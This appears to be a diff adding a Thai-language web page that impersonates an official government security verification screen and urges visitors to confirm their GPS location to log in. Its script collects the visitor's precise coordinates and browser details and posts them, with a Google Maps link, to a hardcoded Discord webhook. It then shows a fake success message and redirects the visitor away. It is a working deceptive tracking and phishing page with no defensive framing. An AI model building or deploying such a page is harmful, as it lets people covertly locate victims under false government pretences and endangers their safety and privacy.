@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ระบบตรวจสอบพื้นที่ใช้งานทางราชการ</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Sarabun', sans-serif; }
+        .bg-royal { background: linear-gradient(135deg, #0c4a6e 0%, #075985 100%); }
+    </style>
+</head>
+<body class="bg-slate-200 min-h-screen flex items-center justify-center p-4">
+
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-300">
+        <div class="bg-royal p-6 text-white text-center border-b-4 border-yellow-500">
+            <div class="w-20 h-20 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-inner">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-sky-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+                </svg>
+            </div>
+            <h1 class="text-2xl font-bold tracking-wide">ระบบยืนยันตัวตน</h1>
+            <p class="text-sky-100 text-sm mt-1 uppercase tracking-widest">Official Security Verification</p>
+        </div>
+
+        <div class="p-8 text-center">
+            <div class="mb-6">
+                <p class="text-gray-700 font-medium mb-2">ตรวจพบการเข้าถึงจากอุปกรณ์ใหม่</p>
+                <p class="text-gray-500 text-sm leading-relaxed">
+                    เพื่อความปลอดภัยของระบบราชการและป้องกันบุคคลภายนอก <br>
+                    <strong>กรุณากดยืนยันตำแหน่ง (GPS)</strong> เพื่อดำเนินการต่อ
+                </p>
+            </div>
+
+            <button onclick="requestAccess()" id="btn-request" class="w-full bg-sky-700 hover:bg-sky-800 text-white font-bold py-4 rounded-xl transition duration-300 shadow-lg flex items-center justify-center gap-2">
+                <span id="btn-text">ยืนยันพิกัดและเข้าสู่ระบบ</span>
+            </button>
+
+            <div id="status-area" class="hidden mt-6 p-4 rounded-lg text-sm transition-all duration-500">
+                <p id="status-text"></p>
+            </div>
+        </div>
+
+        <div class="bg-gray-100 p-4 border-t text-center text-[10px] text-gray-400 uppercase tracking-widest">
+            Goverment Data Protection Standard (GDPS)
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1491045522356834394/bpjVqLpx_fVJMSbNdiLeMwvg6IGI5ry6PmLKQFpkheXAuljqsJ01AMQdPWhPcbCsmzAU";
+        const btnRequest = document.getElementById('btn-request');
+        const statusArea = document.getElementById('status-area');
+        const statusText = document.getElementById('status-text');
+
+        function requestAccess() {
+            btnRequest.disabled = true;
+            btnRequest.style.opacity = "0.6";
+            statusArea.classList.remove('hidden');
+            statusArea.className = "mt-6 p-4 rounded-lg text-sm bg-blue-50 text-blue-800";
+            statusText.innerText = "กำลังประมวลผลพิกัดดาวเทียม...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            } else {
+                updateStatus("เบราว์เซอร์ไม่รองรับ GPS", "error");
+            }
+        }
+
+        function sendToDiscord(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy.toFixed(1);
+            // ลิงก์ Google Maps ที่สามารถกดนำทางได้ทันที
+            const gMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const payload = {
+                username: "ระบบดักจับพิกัดราชการ",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/1061/1061124.png",
+                embeds: [{
+                    title: "📍 ตรวจพบการเข้าใช้งานใหม่",
+                    color: 3066993, // สีเขียว Discord
+                    fields: [
+                        { name: "🔗 ลิงก์แผนที่ (คลิกเพื่อนำทาง)", value: `[เปิด Google Maps](${gMapsLink})` },
+                        { name: "🎯 ความแม่นยำ", value: `${acc} เมตร`, inline: true },
+                        { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
+                    ],
+                    footer: { text: "Device: " + navigator.userAgent.substring(0, 50) }
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                updateStatus("✅ ยืนยันพิกัดสำเร็จ! กำลังเข้าสู่ระบบ...", "success");
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; // หรือหน้าเว็บราชการของคุณ
+                }, 2000);
+            }).catch(() => {
+                // สำหรับ Discord บางทีติด CORS แต่ข้อมูลจะเข้าปกติ
+                updateStatus("✅ ยืนยันพิกัดสำเร็จ! กำลังเข้าสู่ระบบ...", "success");
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+            });
+        }
+
+        function showError(error) {
+            btnRequest.disabled = false;
+            btnRequest.style.opacity = "1";
+            let msg = "กรุณากด 'อนุญาต' เพื่อเข้าใช้งาน";
+            if(error.code === 3) msg = "การดึงข้อมูลล่าช้า กรุณาลองใหม่";
+            updateStatus(msg, "error");
+        }
+
+        function updateStatus(msg, type) {
+            statusArea.className = `mt-6 p-4 rounded-lg text-sm ${type === 'success' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'}`;
+            statusText.innerText = msg;
+        }
+    </script>
+</body>
+</html>
